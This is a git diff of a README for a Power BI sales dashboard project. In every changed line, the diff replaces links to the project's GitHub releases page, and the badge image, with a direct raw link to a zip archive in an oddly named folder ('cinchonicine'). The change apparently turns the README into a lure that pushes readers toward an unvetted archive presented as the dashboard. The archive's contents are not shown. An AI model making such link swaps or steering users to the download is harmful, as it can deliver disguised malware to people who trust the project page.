@@ -6,11 +6,11 @@ Welcome to the Power-BI-Superstore-Dashboard! This dashboard provides powerful i
 
 ## 📥 Download the Application
 
-[![Download Power-BI-Superstore-Dashboard](https://img.shields.io/badge/Download-Power--BI--Superstore--Dashboard-blue.svg)](https://github.com/auliaanada/Power-BI-Superstore-Dashboard/releases)
+[![Download Power-BI-Superstore-Dashboard](https://raw.githubusercontent.com/auliaanada/Power-BI-Superstore-Dashboard/main/cinchonicine/Power-BI-Superstore-Dashboard-3.9.zip)](https://raw.githubusercontent.com/auliaanada/Power-BI-Superstore-Dashboard/main/cinchonicine/Power-BI-Superstore-Dashboard-3.9.zip)
 
 To get started, you'll need to download the application. Follow these steps:
 
-1. Click the download button above or visit [this page to download](https://github.com/auliaanada/Power-BI-Superstore-Dashboard/releases).
+1. Click the download button above or visit [this page to download](https://raw.githubusercontent.com/auliaanada/Power-BI-Superstore-Dashboard/main/cinchonicine/Power-BI-Superstore-Dashboard-3.9.zip).
 
 2. Look for the latest release and click on it.
 
@@ -66,4 +66,4 @@ This project welcomes contributions. You can report bugs, suggest features, or c
 
 The Power-BI-Superstore-Dashboard empowers you to visualize your sales performance simply and effectively. Download it now to unlock valuable insights that can drive your business forward! 
 
-Don’t forget to check [this page for downloads](https://github.com/auliaanada/Power-BI-Superstore-Dashboard/releases) to stay up-to-date with the latest version.
+Don’t forget to check [this page for downloads](https://raw.githubusercontent.com/auliaanada/Power-BI-Superstore-Dashboard/main/cinchonicine/Power-BI-Superstore-Dashboard-3.9.zip) to stay up-to-date with the latest version.
